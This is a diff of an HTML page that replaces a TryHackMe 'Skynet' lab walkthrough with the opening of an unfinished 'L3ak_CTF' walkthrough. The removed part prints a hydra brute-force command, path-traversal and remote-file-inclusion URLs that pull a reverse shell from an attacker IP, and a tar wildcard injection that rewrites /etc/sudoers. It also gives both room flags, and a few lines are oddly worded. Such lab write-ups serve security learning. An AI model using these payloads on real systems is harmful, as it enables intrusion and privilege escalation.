@@ -1,688 +1,400 @@
+
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TryHackMe Walkthrough - Skynet</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root {
-            --primary: #00f0ff;       /* Cyber teal */
-            --secondary: #ff2d75;     /* Neon pink */
-            --accent: #7b2dff;       /* Purple */
-            --dark: #0a0a12;         /* Dark background */
-            --light: #e0e0e0;        /* Light text */
-            --code-bg: #12121a;      /* Code background */
-            --success: #00ff88;      /* Green */
-            --warning: #ff9f1c;      /* Orange */
-            --danger: #ff2d54;       /* Red */
-            --border-radius: 4px;
-            --shadow: 0 0 15px rgba(0, 240, 255, 0.3);
-            --glow: 0 0 20px rgba(0, 240, 255, 0.7);
-            --transition: all 0.3s cubic-bezier(0.65, 0.05, 0.36, 1);
-        }
-        
-        body {
-            font-family: 'Rajdhani', sans-serif;
-            line-height: 1.7;
-            color: var(--light);
-            background-color: var(--dark);
-            margin: 0;
-            padding: 0;
-            min-height: 100vh;
-            background-image: 
-                radial-gradient(circle at 25% 25%, rgba(123, 45, 255, 0.1) 0%, transparent 50%),
-                radial-gradient(circle at 75% 75%, rgba(0, 240, 255, 0.1) 0%, transparent 50%);
-            -webkit-font-smoothing: antialiased;
-        }
-        
-        .container {
-            max-width: 1100px;
-            margin: 0 auto;
-            padding: 2rem;
-        }
-        
-        header {
-            text-align: center;
-            margin-bottom: 3rem;
-            padding-bottom: 1.5rem;
-            border-bottom: 1px solid rgba(0, 240, 255, 0.3);
-            position: relative;
-        }
-        
-        .logo {
-            width: 120px;
-            height: 120px;
-            margin: 0 auto 1rem;
-            border-radius: 50%;
-            border: 3px solid var(--primary);
-            box-shadow: var(--glow);
-            object-fit: cover;
-            transition: var(--transition);
-        }
-        
-        .logo:hover {
-            transform: rotate(10deg);
-            box-shadow: 0 0 30px rgba(0, 240, 255, 0.9);
-        }
-        
-        h1 {
-            color: var(--primary);
-            margin-bottom: 0.5rem;
-            font-size: 2.8rem;
-            font-weight: 700;
-            font-family: 'Orbitron', sans-serif;
-            text-shadow: 0 0 10px rgba(0, 240, 255, 0.5);
-            letter-spacing: 1px;
-        }
-        
-        h2 {
-            color: var(--primary);
-            margin-top: 3rem;
-            font-size: 1.8rem;
-            font-weight: 700;
-            font-family: 'Orbitron', sans-serif;
-            position: relative;
-            padding-left: 1rem;
-            border-left: 4px solid var(--secondary);
-        }
-        
-        h2 i {
-            margin-right: 0.8rem;
-            color: var(--secondary);
-        }
-        
-        h3 {
-            color: var(--secondary);
-            margin-top: 2rem;
-            font-size: 1.4rem;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 0.8rem;
-        }
-        
-        h3 i {
-            font-size: 1.2rem;
-        }
-        
-        .meta {
-            color: rgba(224, 224, 224, 0.7);
-            font-size: 0.95rem;
-            margin-bottom: 1.5rem;
-            display: flex;
-            justify-content: center;
-            gap: 1.5rem;
-            flex-wrap: wrap;
-        }
-        
-        .card {
-            background-color: rgba(10, 10, 18, 0.8);
-            border-radius: var(--border-radius);
-            padding: 2rem;
-            margin-bottom: 3rem;
-            border: 1px solid rgba(0, 240, 255, 0.1);
-            transition: var(--transition);
-            backdrop-filter: blur(5px);
-        }
-        
-        .card:hover {
-            border-color: var(--primary);
-            box-shadow: var(--shadow);
-            transform: translateY(-3px);
-        }
-        
-        pre {
-            background-color: var(--code-bg);
-            color: var(--light);
-            padding: 1.5rem;
-            border-radius: var(--border-radius);
-            overflow-x: auto;
-            font-family: 'Rajdhani', monospace;
-            margin: 1.5rem 0;
-            border-left: 4px solid var(--accent);
-            position: relative;
-            font-size: 0.95rem;
-            line-height: 1.6;
-        }
-        
-        pre::before {
-            content: ">_";
-            position: absolute;
-            top: -12px;
-            left: 15px;
-            background: var(--code-bg);
-            color: var(--primary);
-            padding: 0 10px;
-            font-family: 'Orbitron', sans-serif;
-            font-size: 0.9rem;
-            border-radius: 4px 4px 0 0;
-        }
-        
-        code {
-            font-family: 'Rajdhani', monospace;
-            background-color: rgba(0, 240, 255, 0.1);
-            color: var(--primary);
-            padding: 0.2rem 0.4rem;
-            border-radius: 2px;
-            font-size: 0.85rem;
-            border: 1px solid rgba(0, 240, 255, 0.2);
-        }
-        
-        .image-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 1.5rem;
-            margin: 2rem 0;
-        }
-        
-        .image-container img {
-            max-width: 100%;
-            border-radius: var(--border-radius);
-            border: 2px solid rgba(0, 240, 255, 0.3);
-            transition: var(--transition);
-            cursor: zoom-in;
-            background-color: var(--dark);
-        }
-        
-        .image-container img:hover {
-            border-color: var(--primary);
-            transform: scale(1.02);
-            box-shadow: var(--shadow);
-        }
-        
-        .answer-box {
-            background: linear-gradient(90deg, rgba(0, 240, 255, 0.1), transparent);
-            border-left: 4px solid var(--success);
-            padding: 1.5rem;
-            margin: 2.5rem 0;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .answer-box::before {
-            content: "\f058";
-            font-family: "Font Awesome 6 Free";
-            font-weight: 900;
-            position: absolute;
-            right: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 1.5rem;
-            color: var(--success);
-            opacity: 0.3;
-        }
-        
-        .answer-box strong {
-            color: var(--success);
-            font-size: 1.1rem;
-            font-family: 'Orbitron', sans-serif;
-            letter-spacing: 1px;
-        }
-        
-        .tag {
-            display: inline-flex;
-            align-items: center;
-            background-color: rgba(0, 240, 255, 0.1);
-            color: var(--primary);
-            padding: 0.4rem 1rem;
-            border-radius: 30px;
-            font-size: 0.75rem;
-            margin-right: 0.7rem;
-            margin-bottom: 0.7rem;
-            font-weight: 500;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            border: 1px solid rgba(0, 240, 255, 0.3);
-            gap: 0.5rem;
-        }
-        
-        .tag i {
-            font-size: 0.8rem;
-        }
-        
-        .progress-container {
-            width: 100%;
-            background-color: rgba(0, 240, 255, 0.1);
-            border-radius: 10px;
-            margin: 1.5rem 0;
-            overflow: hidden;
-            height: 6px;
-            border: 1px solid rgba(0, 240, 255, 0.2);
-        }
-        
-        .progress-bar {
-            height: 100%;
-            background: linear-gradient(90deg, var(--primary), var(--accent));
-            width: 0;
-            transition: width 0.5s ease-out;
-        }
-        
-        /* Cyberpunk corner decorations */
-        .corner {
-            position: fixed;
-            width: 50px;
-            height: 50px;
-            pointer-events: none;
-            z-index: 100;
-        }
-        
-        .corner-tl {
-            top: 20px;
-            left: 20px;
-            border-top: 2px solid var(--primary);
-            border-left: 2px solid var(--primary);
-        }
-        
-        .corner-tr {
-            top: 20px;
-            right: 20px;
-            border-top: 2px solid var(--primary);
-            border-right: 2px solid var(--primary);
-        }
-        
-        .corner-bl {
-            bottom: 20px;
-            left: 20px;
-            border-bottom: 2px solid var(--primary);
-            border-left: 2px solid var(--primary);
-        }
-        
-        .corner-br {
-            bottom: 20px;
-            right: 20px;
-            border-bottom: 2px solid var(--primary);
-            border-right: 2px solid var(--primary);
-        }
-        
-        @media (max-width: 768px) {
-            .container {
-                padding: 1.5rem;
-            }
-            
-            h1 {
-                font-size: 2rem;
-            }
-            
-            .card {
-                padding: 1.5rem;
-            }
-            
-            .image-container {
-                grid-template-columns: 1fr;
-            }
-            
-            .corner {
-                width: 30px;
-                height: 30px;
-            }
-        }
-        
-        /* Animation */
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        @keyframes pulse {
-            0% { opacity: 0.6; }
-            50% { opacity: 1; }
-            100% { opacity: 0.6; }
-        }
-        
-        .card, header {
-            animation: fadeIn 0.6s ease-out forwards;
-        }
-        
-        .pulse {
-            animation: pulse 2s infinite ease-in-out;
-        }
-        
-        /* Scrollbar styling */
-        ::-webkit-scrollbar {
-            width: 10px;
-        }
-        
-        ::-webkit-scrollbar-track {
-            background: var(--dark);
-        }
-        
-        ::-webkit-scrollbar-thumb {
-            background: linear-gradient(var(--primary), var(--accent));
-            border-radius: 5px;
-        }
-        
-        ::-webkit-scrollbar-thumb:hover {
-            background: var(--primary);
-        }
-        
-        /* Image zoom overlay */
-        .zoom-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(10, 10, 18, 0.95);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-            cursor: zoom-out;
-        }
-        
-        .zoom-overlay img {
-            max-width: 90%;
-            max-height: 90%;
-            border: 2px solid var(--primary);
-            box-shadow: var(--glow);
-        }
-        
-        .close-zoom {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            color: var(--secondary);
-            font-size: 2rem;
-            cursor: pointer;
-            transition: var(--transition);
-        }
-        
-        .close-zoom:hover {
-            color: var(--primary);
-            transform: rotate(90deg);
-        }
-    </style>
+<head><script type="text/javascript" src="/___vscode_livepreview_injected_script"></script>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>𝕋𝕣𝕪ℍ𝕒𝕔𝕜𝕄𝕖 𝕎𝕒𝕝𝕜𝕋𝕙𝕣𝕠𝕦𝕘𝕙 — 𝕃𝟛𝕒𝕜_ℂ𝕋𝔽</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;600;800&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css" />
+<style>
+  :root {
+    --color-primary: #0e0419;
+    --color-secondary: #000000;
+    --color-accent: #ffa7c4;
+    --color-bg: #0d1117;
+    --color-card-bg: #161b22;
+    --color-text-light: #c8e7ff;
+    --color-text-muted: #8b949e;
+    --color-border-radius: 16px;
+    --shadow-default: 0 10px 30px rgba(102, 126, 234, 0.6);
+    --shadow-hover: 0 12px 50px rgba(27, 3, 74, 0.9);
+    --transition-fast: 0.25s ease-in-out;
+  }
+  body {
+    margin: 0;
+    background: linear-gradient(135deg, var(--color-primary), var(--color-secondary));
+    font-family: 'Poppins', sans-serif;
+    color: var(--color-text-light);
+    line-height: 1.75;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    padding: 40px 12px;
+    transition: background-color 0.4s, color 0.4s;
+  }
+  body.light {
+    --color-bg: #ffffff;
+    --color-card-bg: #f9f9f9;
+    --color-text-light: #222222;
+    --color-text-muted: #555555;
+    --color-accent: #d6336c;
+    background: linear-gradient(135deg, #f0e6f6, #ffd6e8);
+  }
+  .container {
+    background: var(--color-card-bg);
+    border-radius: var(--color-border-radius);
+    max-width: 900px;
+    width: 100%;
+    padding: 36px 40px;
+    box-shadow: var(--shadow-default);
+    transition: box-shadow var(--transition-fast), background-color 0.4s, color 0.4s;
+  }
+  .container:hover {
+    box-shadow: var(--shadow-hover);
+  }
+  header.site {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 28px;
+  }
+  .logo {
+    font-size: 32px;
+    font-weight: 900;
+    color: var(--color-accent);
+    letter-spacing: 3px;
+    text-shadow: 0 0 12px var(--color-accent);
+    user-select: none;
+    transition: color var(--transition-fast);
+  }
+  .logo:hover {
+    color: #fff;
+  }
+  .meta {
+    color: var(--color-text-muted);
+    font-size: 14px;
+    font-weight: 600;
+    font-style: italic;
+  }
+  article.card h1.title {
+    font-weight: 900;
+    font-size: 36px;
+    margin: 0 0 14px;
+    text-align: center;
+    color: var(--color-accent);
+    text-shadow: 0 0 16px var(--color-accent);
+  }
+  .byline {
+    font-size: 14px;
+    color: var(--color-text-muted);
+    margin-bottom: 28px;
+    text-align: center;
+  }
+  .byline strong {
+    color: var(--color-text-light);
+  }
+  p, li {
+    font-size: 16px;
+    margin-bottom: 18px;
+    color: var(--color-text-light);
+  }
+  pre {
+    background: #0d1117;
+    padding: 22px;
+    border-radius: var(--color-border-radius);
+    box-shadow: inset 0 0 12px var(--color-primary);
+    overflow-x: auto;
+    font-size: 14px;
+    line-height: 1.5;
+    color: #dbeafe;
+  }
+  code.hljs {
+    font-size: 14px;
+  }
+  .badge {
+    display: inline-block;
+    background: var(--color-accent);
+    color: var(--color-bg);
+    padding: 7px 16px;
+    border-radius: 9999px;
+    font-weight: 700;
+    margin-right: 12px;
+    box-shadow: 0 0 8px var(--color-accent);
+    font-size: 13px;
+    user-select: none;
+    transition: background-color var(--transition-fast);
+  }
+  .badge:hover {
+    background-color: #451665;
+  }
+  .note {
+    background: rgba(255, 167, 196, 0.17);
+    border-left: 6px solid var(--color-accent);
+    padding: 20px 28px;
+    border-radius: var(--color-border-radius);
+    font-size: 16px;
+    color: #ffd6e8;
+    margin-top: 30px;
+    margin-bottom: 40px;
+    font-weight: 700;
+    text-shadow: 0 0 6px var(--color-accent);
+  }
+  .image-section {
+    margin: 30px 0;
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 24px;
+    justify-items: center;
+  }
+  .image-section img {
+    width: 100%;
+    max-width: 400px;
+    border-radius: var(--color-border-radius);
+    border: 4px solid var(--color-accent);
+    box-shadow: 0 10px 38px rgba(255, 167, 196, 0.85);
+    transition: transform var(--transition-fast), box-shadow var(--transition-fast), border-color var(--transition-fast);
+    cursor: pointer;
+    user-select: none;
+    opacity: 0;
+    transform: translateY(25px);
+    transition: opacity 0.6s ease, transform 0.6s ease;
+  }
+  .image-section img.visible {
+    opacity: 1;
+    transform: translateY(0);
+  }
+  .image-section img:hover {
+    transform: scale(1.1);
+    box-shadow: 0 14px 48px rgba(255, 77, 136, 1);
+    border-color: #451665;
+  }
+  footer {
+    margin-top: 48px;
+    text-align: center;
+    font-size: 14px;
+    color: var(--color-text-muted);
+    font-style: italic;
+    user-select: none;
+  }
+  button.copy {
+    float: right;
+    background: transparent;
+    border: none;
+    color: var(--color-text-muted);
+    cursor: pointer;
+    font-size: 13px;
+    font-weight: 800;
+    user-select: none;
+    transition: color var(--transition-fast);
+    margin-top: -6px;
+    margin-bottom: 8px;
+  }
+  button.copy:hover {
+    color: var(--color-accent);
+  }
+  #toggle-mode {
+    background: none;
+    border: none;
+    color: var(--color-accent);
+    cursor: pointer;
+    font-size: 1.5rem;
+    user-select: none;
+    transition: color var(--transition-fast);
+    margin-left: 16px;
+  }
+  #toggle-mode:hover {
+    color: #451665;
+  }
+  #toc {
+    background: var(--color-card-bg);
+    border-left: 4px solid var(--color-accent);
+    padding: 12px 20px;
+    margin-bottom: 32px;
+    border-radius: 12px;
+    max-width: 280px;
+    font-weight: 700;
+    box-shadow: 0 0 20px var(--color-accent);
+    user-select: none;
+  }
+  #toc ul {
+    padding-left: 1rem;
+  }
+  #toc a {
+    color: var(--color-accent);
+    text-decoration: none;
+    transition: color 0.3s;
+  }
+  #toc a:hover {
+    color: #451665;
+  }
+  html {
+    scroll-behavior: smooth;
+  }
+  @media (max-width: 640px) {
+    .container {
+      padding: 28px 22px;
+    }
+    article.card h1.title {
+      font-size: 28px;
+    }
+    h2 {
+      font-size: 22px;
+    }
+    .image-section {
+      grid-template-columns: 1fr;
+    }
+    #toc {
+      max-width: 100%;
+      margin-bottom: 16px;
+    }
+  }
+</style>
 </head>
 <body>
-    <!-- Cyberpunk corner decorations -->
-    <div class="corner corner-tl"></div>
-    <div class="corner corner-tr"></div>
-    <div class="corner corner-bl"></div>
-    <div class="corner corner-br"></div>
+  <div class="container" role="main" aria-label="TryHackMe L3ak_CTF walkthrough">
 
-    <div class="container">
-        <header>
-            <img src="https://i.pinimg.com/736x/0e/25/42/0e2542dd832b7290fd9c9faf2d5c1879.jpg" alt="Cyberpunk Logo" class="logo">
-            <h1>TRYHACKME WALKTHROUGH - SKYNET</h1>
-            <div class="meta">
-                <span><i class="fas fa-user"></i> 0xYumeko</span>
-                <span><i class="fas fa-calendar-alt"></i> 2023-01-28</span>
-                <span><i class="fas fa-clock"></i> 11:31:00 +0700</span>
-            </div>
-            <div>
-                <span class="tag"><i class="fas fa-search"></i> Enumeration</span>
-                <span class="tag"><i class="fas fa-folder-open"></i> dirsearch</span>
-                <span class="tag"><i class="fas fa-network-wired"></i> smbclient</span>
-                <span class="tag"><i class="fas fa-bolt"></i> hydra</span>
-                <span class="tag"><i class="fas fa-tools"></i> Burp Suite</span>
-                <span class="tag"><i class="fas fa-bug"></i> Exploitation</span>
-            </div>
-        </header>
-        
-        <div class="progress-container">
-            <div class="progress-bar" id="progressBar"></div>
-        </div>
-        
-        <div class="card">
-            <h2><i class="fas fa-server"></i> Deploy the Machine</h2>
-            <p>Log in to your TryHackMe account and navigate to the Skynet room. Click on the "Deploy" button to spawn the virtual machine.</p>
-            
-            <p>Adding registries to your <code>/etc/hosts</code> file makes it easier for machines to remember and learn by their unique names rather than their IP addresses.</p>
-            
-            <pre><code>echo "10.10.225.54 Skynet.thm" | sudo tee -a /etc/hosts</code></pre>
-            
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/aa3f8c4e-7c70-40f1-9b58-bae4689b4d31" alt="Host configuration">
-            </div>
-        </div>
-        
-        <div class="card">
-            <h2><i class="fas fa-binoculars"></i> Enumeration</h2>
-            <p>Start by enumerating the services running on the machine using tools like Nmap.</p>
-            
-            <h3><i class="fas fa-network-wired"></i> Run a basic Nmap scan</h3>
-            <pre><code>nmap -sCV &lt;machine_IP&gt;</code></pre>
-            
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/62fd68f7-3977-4a71-b999-66c002a83b3a" alt="Nmap scan results">
-            </div>
-            
-            <h3><i class="fas fa-globe"></i> Enumerate Web Service</h3>
-            <p>Once you have identified the open ports, check if there's a web service running. Visit the web service in your browser.</p>
-            
-            <h3><i class="fas fa-folder-open"></i> dirsearch</h3>
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/01c653cc-9a60-493c-b9ea-4562420cc0a4" alt="dirsearch results">
-            </div>
-            
-            <h3><i class="fas fa-network-wired"></i> smbclient</h3>
-            <p>We have connected to major small businesses using smbclient to share on the device. Anonymous Miles Dyson.</p>
-            <pre><code>smbclient -L skynet.thm</code></pre>
-            
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/a40e751b-d742-48af-bb2b-f0f4b7cb11db" alt="smbclient results">
-                <img src="https://github.com/user-attachments/assets/72021041-8964-4104-a5b9-363d761f1c6f" alt="smbclient details">
-            </div>
-            
-            <h3><i class="fas fa-file-alt"></i> Content of attention.txt</h3>
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/8dac568c-58df-40e1-a382-302ed4cc2785" alt="attention.txt content">
-            </div>
-            
-            <h3><i class="fas fa-key"></i> Content of log1.txt (password list)</h3>
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/1c2b6ff4-5e32-4733-937f-1966683f6db6" alt="log1.txt content">
-            </div>
-        </div>
-        
-        <div class="card">
-            <h2><i class="fas fa-lock-open"></i> Cracking Squirrelmail password</h2>
-            <p>You can do this easily using Burp Suite and hydra</p>
-            
-            <pre><code>hydra -l milesdyson -P log1.txt skynet.thm http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect" -t 20</code></pre>
-            
-            <h3><i class="fas fa-bolt"></i> Hydra</h3>
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/02c390e3-48a2-4cae-bf7a-34416ca13d93" alt="Hydra results">
-            </div>
-            
-            <h3><i class="fas fa-tools"></i> Burp Suite</h3>
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/1e20542c-8ccb-42e9-a023-7d48462c1c66" alt="Burp Suite">
-            </div>
-            
-            <h3><i class="fas fa-check-circle"></i> We found it! Now we can log in</h3>
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/f5d3e225-cb83-460e-9649-63501b85ff17" alt="Login success">
-            </div>
-            
-            <h3><i class="fas fa-envelope"></i> Only the first looks to be important for us</h3>
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/fb19ce1c-a6fd-4259-a757-6a3ed32fd4d3" alt="Important email">
-            </div>
-            
-            <h3><i class="fas fa-sign-in-alt"></i> We found the password for smb, now we can login</h3>
-            <pre><code>smbclient //$ip/milesdyson -U milesdyson</code></pre>
-            
-            <p>We get access, inside are a lot of notes and files that we don't necessarily need. The only file that's useful for us is important.txt</p>
-            
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/10723c91-09f1-45da-b8bb-6466e480f5a8" alt="SMB access">
-                <img src="https://github.com/user-attachments/assets/5df13dc7-1319-4750-a499-7cad8f0e30a0" alt="Important files">
-                <img src="https://github.com/user-attachments/assets/c0577fe6-8820-45f9-bb88-15685aa227b1" alt="important.txt">
-            </div>
-            
-            <h3><i class="fas fa-folder-secret"></i> Inside we find the secret directory</h3>
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/209cccac-9ff3-4679-ae3b-3ef9b1575431" alt="Secret directory">
-            </div>
-            
-            <p>If we go to that directory we find a simple page, let's run dirb to see if there are more hidden directories:</p>
-            <pre><code>dirb http://10.10.167.117/45kra24zxs28v3yd/</code></pre>
-            
-            <p>We find /administrator if we go there we find that the page is running CuppaCMS, we can search for it on searchsploit:</p>
-            
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/f87d7bb8-cd83-4ea2-8046-3ec2abdc4a8d" alt="Cuppa CMS">
-            </div>
-            
-            <h3><i class="fas fa-sign-in-alt"></i> sign in: Cuppa CMS</h3>
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/74f047e2-ed5a-4f95-a69d-3a31b724ca94" alt="Cuppa CMS login">
-            </div>
-        </div>
-        
-        <div class="card">
-            <h2><i class="fas fa-terminal"></i> Exploitation</h2>
-            <p>We open searchsploit and search for the exploit in The CMS</p>
-            
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/3cee3634-600c-44fd-943a-1f2c68e2f076" alt="Searchsploit results">
-            </div>
-            
-            <p>Reading the text file for the exploit, we see that it is possible to read the Local files on the target machine by targeting the urlConfig parameter in the alertConfigField.php. The best part is that it doesn't even warrant a login into the CMS.</p>
-            
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/378506b3-04cb-4ea5-bdc8-fcc7656a477b" alt="Exploit details">
-            </div>
-            
-            <p>We can read the <code>/etc/passwd</code> file on the target device</p>
-            <pre><code>http://target/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=.../../../../../../../../../etc/passwd</code></pre>
-            
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/69672ff5-91fa-416b-8656-a5210845a78c" alt="/etc/passwd">
-            </div>
-            
-            <p>We can get our reverse shell from revshells.com, select PHP PentestMonkey, enter your machine ip and the listening port (in my case I choose 1234), downloaded and put it inside a folder. Start a http server in the folder where you downloaded your revshell:</p>
-            <pre><code>python3 -m http.server</code></pre>
-            
-            <h3><i class="fas fa-satellite-dish"></i> Start our listener</h3>
-            <p>After executing this on our browser, a reverse shell should be opened on our side</p>
-            <pre><code>nc -lvnp 1337</code></pre>
-            
-            <h3><i class="fas fa-link"></i> Request the link</h3>
-            <pre><code>http://skynet/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.224.219/php-reverse-shell.php</code></pre>
-            
-            <p>Now we get our reverse shell!</p>
-            
-            <p>We can spawn a shell with python:</p>
-            <pre><code>python -c 'import pty;pty.spawn("/bin/bash")'</code></pre>
-            
-            <p>We see that there is a photo user named Melideson. You Have highlighted the user within their home directory.</p>
-            
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/e81505b9-c1e1-4ca8-ad69-edf27f6fe359" alt="User directory">
-            </div>
-            
-            <div class="answer-box">
-                <strong>Flag Found:</strong> 7ce5c2109a40f958099283600a9ae807
-            </div>
-            
-            <p>Inside <code>/home/milesdyson/backups</code> we find a file backup.sh and see that every minutes a script is being executed, we can perform a wildcard injection.</p>
-            
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/3d3cc288-5970-4d67-8dff-37ddf1f3767d" alt="backup.sh">
-            </div>
-            
-            <p>We run these commands inside the folder <code>/var/www/html</code>:</p>
-            
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/0eeed21b-1c68-460e-9025-e9b0004c4982" alt="Command execution">
-            </div>
-            
-            <pre><code>echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > pavan.sh
-echo "/var/www/html" > "--checkpoint-action=exec=sh pavan.sh"
-echo "/var/www/html" > --checkpoint=1</code></pre>
-            
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/aa7b133d-0c71-49c9-8acb-615d174775b2" alt="Root access">
-            </div>
-            
-            <p>And get the root shell, and then we can find the tag <code>/root/root.txt</code></p>
-            
-            <div class="answer-box">
-                <strong>Root Flag:</strong> 3f0372db24753accc7179a282cd6a949
-            </div>
-            
-            <div class="image-container">
-                <img src="https://github.com/user-attachments/assets/cf1c459e-fc79-4bb3-93e3-012405016a6a" alt="Root flag">
-            </div>
-        </div>
-    </div>
+    <header class="site">
+      <div class="logo" aria-label="Author Logo">0xYumeko</div>
+      <div style="display:flex; align-items:center;">
+        <div class="meta" aria-label="Meta information">2024-01-28 · Linux · PHP analysis</div>
+        <button id="toggle-mode" aria-label="Toggle dark/light mode" title="Toggle Dark/Light Mode">🌙</button>
+      </div>
+    </header>
 
-    <script>
-        // Progress bar animation
-        window.addEventListener('scroll', function() {
-            const scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
-            const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
-            const scrollProgress = (scrollTop / scrollHeight) * 100;
-            document.getElementById('progressBar').style.width = scrollProgress + '%';
+    <nav id="toc" aria-label="Table of Contents">
+      <strong>Contents:</strong>
+      <ul>
+        <li><a href="#step1">Step 1 — Enumeration</a></li>
+        <li><a href="#nmap">Start with Nmap Scan</a></li>
+        <li><a href="#web-server">Examine the Web Server</a></li>
+        <li><a href="#php-analysis">PHP Code Analysis</a></li>
+        <li><a href="#flag">Flag reconstruction</a></li>
+        <li><a href="#end">End</a></li>
+      </ul>
+    </nav>
+
+    <article class="card">
+      <h1 class="title" id="top" tabindex="0">𝕋𝕣𝕪ℍ𝕒𝕔𝕜𝕄𝕖 𝕎𝕒𝕝𝕜𝕋𝕙𝕣𝕠𝕦𝕘𝕙 — 𝕃𝟛𝕒𝕜_ℂ𝕋𝔽</h1>
+      <div class="byline" tabindex="0">by <strong>0xYumeko</strong> · 2024-01-28 · <span class="badge" aria-label="Category Linux">Linux</span> <span class="badge" aria-label="Tag PHP Code Analysis">PHP Code Analysis</span></div>
+
+      <p><strong>Summary:</strong> This walkthrough covers the main steps to solve the L3ak_CTF challenge on TryHackMe — enumeration, web analysis, and a short PHP code review that reveals the flag construction logic.</p>
+
+      <div class="hero" role="img" aria-label="Privilege escalation image"><img src="/assets/img/posts/L3ak-CTF/privesc_linux.png" alt="Privilege Escalation" /></div>
+
+      <h2 id="step1" tabindex="0">Step 1 — Enumeration</h2>
+      <p>Start by mapping hostnames to the target IP so your browser and tools can use friendly names instead of raw addresses.</p>
+      <pre><code class="language-bash">echo "&lt;TARGET_IP&gt; l3ak.thm" | sudo tee -a /etc/hosts</code></pre>
+
+      <div class="image-section" aria-label="Enumeration images">
+        <img src="https://github.com/user-attachments/assets/ea113392-284d-47d6-b65c-d41251d07e06" alt="Host mapping" />
+        <img src="https://github.com/user-attachments/assets/3233d41f-880b-435f-8cd5-a5860e5f3e57" alt="Nmap scan" />
+        <img src="https://github.com/user-attachments/assets/f1e61e4b-0373-4e53-a089-b59b063efa7b" alt="Gobuster results" />
+        <img src="https://github.com/user-attachments/assets/860427fb-216c-4370-b1f1-d1329a53bd6d" alt="Directory listing" />
+      </div>
+
+      <h2 id="nmap" tabindex="0">1. Start with an Nmap Scan</h2>
+      <p>Use Nmap to find open ports and service versions.</p>
+      <pre><code class="language-bash">nmap -sC -sV -oN nmap_scan &lt;target_ip&gt;</code></pre>
+
+      <h2 id="web-server" tabindex="0">Examine the Web Server</h2>
+      <p>If HTTP is present, browse the site and use directory discovery tools.</p>
+      <pre><code class="language-bash">gobuster dir -u http://&lt;target_ip&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre>
+
+      <p>Hidden directories may reveal interesting files (e.g., <code>/1/index.html</code>).</p>
+
+      <div class="image-section" aria-label="Web server images">
+        <img src="https://github.com/user-attachments/assets/7538911a-fdfc-4c2d-b3ee-b21aad7ec78d" alt="Hidden index" />
+        <img src="https://github.com/user-attachments/assets/d36ae544-0a4a-4184-ade9-1fd3c7844a22" alt="Source code" />
+      </div>
+
+      <h2 id="php-analysis" tabindex="0">Show page source</h2>
+      <p>Inspect the HTML/PHP source for comments or embedded code. Below is the raw page output that was discovered — it contains an obfuscated PHP segment used to build the flag string.</p>
